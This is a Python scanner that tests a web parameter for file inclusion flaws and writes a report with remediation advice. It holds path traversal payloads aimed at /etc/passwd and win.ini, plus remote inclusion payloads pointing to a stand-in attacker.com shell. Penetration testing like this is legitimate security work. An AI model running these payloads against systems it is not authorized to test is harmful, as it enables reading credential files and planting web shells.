#!/usr/bin/env python3
"""
LFI/RFI (Local/Remote File Inclusion) Tester
Tests for file inclusion vulnerabilities.
"""

import sys
import requests
from typing import List

class LFIRFITester:
    def __init__(self, url: str):
        self.url = url
        self.lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '/etc/passwd',
            'C:\\Windows\\win.ini',
            '..\\..\\..\\Windows\\win.ini'
        ]
        self.rfi_payloads = [
            'http://attacker.com/shell.php',
            'http://attacker.com/shell.txt',
            '//attacker.com/shell.php'
        ]
        self.vulnerable = False
    
    def test_lfi(self, param: str) -> bool:
        """Test for Local File Inclusion"""
        print(f"[*] Testing LFI in parameter: {param}")
        
        for payload in self.lfi_payloads:
            try:
                response = requests.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )
                
                # Check for file content indicators
                indicators = ['root:', 'bin/bash', 'for 16-bit', '[fonts]', '[extensions]']
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] Potential LFI vulnerability found with: {payload}")
                    self.vulnerable = True
                    return True
            except:
                pass
        
        return False
    
    def test_rfi(self, param: str) -> bool:
        """Test for Remote File Inclusion"""
        print(f"[*] Testing RFI in parameter: {param}")
        
        for payload in self.rfi_payloads:
            try:
                response = requests.get(
                    self.url,
                    params={param: payload},
                    timeout=5
                )
                
                # Check for remote content
                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[+] Potential RFI vulnerability found with: {payload}")
                    self.vulnerable = True
                    return True
            except:
                pass
        
        return False
    
    def generate_report(self) -> str:
        """Generate LFI/RFI test report"""
        report = f"# LFI/RFI Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **VULNERABLE**: File inclusion vulnerability detected!\n\n"
        else:
            report += "✅ No file inclusion vulnerability detected.\n\n"
        
        report += "## LFI Payloads Tested\n\n"
        for i, payload in enumerate(self.lfi_payloads, 1):
            report += f"{i}. `{payload}`\n"
        report += "\n"
        
        report += "## RFI Payloads Tested\n\n"
        for i, payload in enumerate(self.rfi_payloads, 1):
            report += f"{i}. `{payload}`\n"
        report += "\n"
        
        report += "## Recommendations\n\n"
        report += "1. Use whitelist for allowed files\n"
        report += "2. Avoid user input in file paths\n"
        report += "3. Use absolute paths with validation\n"
        report += "4. Disable remote file inclusion if not needed\n"
        report += "5. Implement proper access controls\n\n"
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python lfi_rfi_tester.py <url> <parameter>")
        print("Example: python lfi_rfi_tester.py http://example.com/page file")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    tester = LFIRFITester(url)
    tester.test_lfi(param)
    tester.test_rfi(param)
    
    report = tester.generate_report()
    
    filename = "lfi_rfi_test_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] LFI/RFI testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

